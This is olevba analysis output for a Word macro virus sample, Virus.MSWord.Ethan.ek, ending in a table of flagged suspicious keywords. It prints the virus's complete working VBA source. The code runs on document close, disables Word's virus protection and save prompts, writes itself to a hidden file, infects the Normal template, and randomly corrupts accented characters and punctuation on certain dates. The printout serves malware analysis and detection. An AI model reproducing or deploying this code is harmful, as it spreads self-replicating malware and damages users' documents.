olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.ek-94b9316e91a6376cc8b1350bd1ef5250cf48b0f5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.ek-94b9316e91a6376cc8b1350bd1ef5250cf48b0f5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

fName = "c:\captainL.$$$"
fAttr = 6

On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Randomize
With Options
  .ConfirmConversions = False
  .VirusProtection = False
  .SaveNormalPrompt = False
End With
'saving to disk
If Dir(fName, fAttr) = "" Then
  Set t = ActiveDocument.VBProject.VBComponents.Item(1)
  Set t = MacroContainer.VBProject.VBComponents.Item(1)
  Open fName For Output As #1
    For i = 1 To t.CodeModule.CountOfLines
      Print #1, t.CodeModule.Lines(i, 1)
    Next
  Close #1
  SetAttr fName, fAttr
End If

Set t1 = NormalTemplate.VBProject.VBComponents.Item(1)
Set t2 = ActiveDocument.VBProject.VBComponents.Item(1)

If t1.CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
  Set t = t1
ElseIf t2.CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
  Set t = t2
Else
  t = ""
End If

'dup
If t <> "" Then
  Open fName For Input As #1
  If LOF(1) <> 0 Then
    i = 1
    Do While Not EOF(1)
      Line Input #1, txt
      t.CodeModule.InsertLines i, txt
      i = i + 1
    Loop
  End If
  Close #1
End If

'action
sav = ActiveDocument.Saved
today = Day(Date)
If (Month(Date) < 4) Or (Month(Date) > 5) Then
  If today = 17 Then
  End If
  Set t = ActiveDocument.Characters
  If (Rnd < 0.321) And (today > 21) Then
    For i = 1 To t.Count
      ch = t.Item(i)
      If ch = "è" Then
        t.Item(i) = "à"
      ElseIf ch = "é" Then t.Item(i) = "e"
      ElseIf ch = "à" Then t.Item(i) = "a"
      ElseIf ch = "ì" Then t.Item(i) = "ù"
      ElseIf ch = "ò" Then t.Item(i) = "o"
      ElseIf ch = "ù" Then t.Item(i) = "ì"
      End If
    Next
  End If
  If (Rnd > 0.777) And (today < 5) Then
    For i = 1 To t.Count
      ch = t.Item(i)
      If ch = ":" Then
        t.Item(i) = "."
      ElseIf ch = "," Then t.Item(i) = " "
      ElseIf (ch = ".") And (Rnd < 0.5) Then t.Item(i) = "!"
      ElseIf ch = "!" Then t.Item(i) = "?"
      ElseIf ch = "?" Then t.Item(i) = "!"
      End If
    Next
  End If
End If

'update doc
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ActiveDocument.Saved = sav

End Sub

Private Sub Document_New()

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
